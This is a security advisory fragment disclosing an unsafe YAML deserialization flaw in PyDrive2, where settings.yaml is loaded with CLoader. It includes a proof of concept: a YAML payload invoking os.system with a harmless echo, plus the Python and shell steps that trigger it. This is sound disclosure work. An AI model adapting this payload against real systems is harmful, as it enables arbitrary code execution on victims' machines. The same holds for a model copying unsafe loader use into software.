  "summary": "PyDrive2's unsafe YAML deserialization in LoadSettingsFile allows arbitrary code execution",
  "details": "### Summary\nUnsafe YAML deserilization will result in arbitrary code execution. A maliciously crafted YAML file can cause arbitrary code execution if PyDrive2 is run in the same directory as it, or if it is loaded in via `LoadSettingsFile`.\n\n### Details\nThe loader being imported from the `yaml` library is `CLoader`: https://github.com/iterative/PyDrive2/blob/30c0f487c0666c0d1944ef774107359f39adc2fa/pydrive2/settings.py#L5\n\nThis loader is then used to load a user supplied file: https://github.com/iterative/PyDrive2/blob/30c0f487c0666c0d1944ef774107359f39adc2fa/pydrive2/settings.py#L108-L121\n\nCLoader is considered unsafe. It will allow any Python code inside of it to be executed. This loading behaviour also happens automatically, the file only needs to be present for this vulnerability to occur.\n\nhttps://github.com/iterative/PyDrive2/blob/30c0f487c0666c0d1944ef774107359f39adc2fa/pydrive2/settings.py#L9\n\nReference: https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf\n\n### PoC\n1. Create a malicious `settings.yaml` file:\n\n```yaml\n!!python/object/new:os.system [echo poc]\n```\n2. Initialize a `GoogleAuth` object .\n```python\nfrom pydrive2.auth import GoogleAuth\n\ngauth = GoogleAuth()\n```\n3. Execute the code with the settings file present in your directory. The code inside the file will be executed:\n```\n[evan@ejedev PyDrive2]$ ls\nCHANGES  client_secrets.json  CONTRIBUTING.rst  docs  examples  LICENSE  main.py  MANIFEST.in  pydrive2  pyproject.toml  pytest.ini  README.rst  settings.yaml  setup.py  tox.ini\n[evan@ejedev PyDrive2]$ cat settings.yaml\n!!python/object/new:os.system [echo poc]\n[evan@ejedev PyDrive2]$ cat main.py \nfrom pydrive2.auth import GoogleAuth\n\n\ngauth = GoogleAuth()\n[evan@ejedev PyDrive2]$ python3 main.py \npoc\n```\nAlternatively, the file can be loaded in directly via `pydrive2.settings.LoadSettingsFile` \n\n### Impact\nThis is a deserilization attack that will affect any user who initializes GoogleAuth from this package while a malicious `yaml` file is present in the same directory. As it does not require it to be directly loaded through the code, only present, I believe this produces an extra element of risk. ",
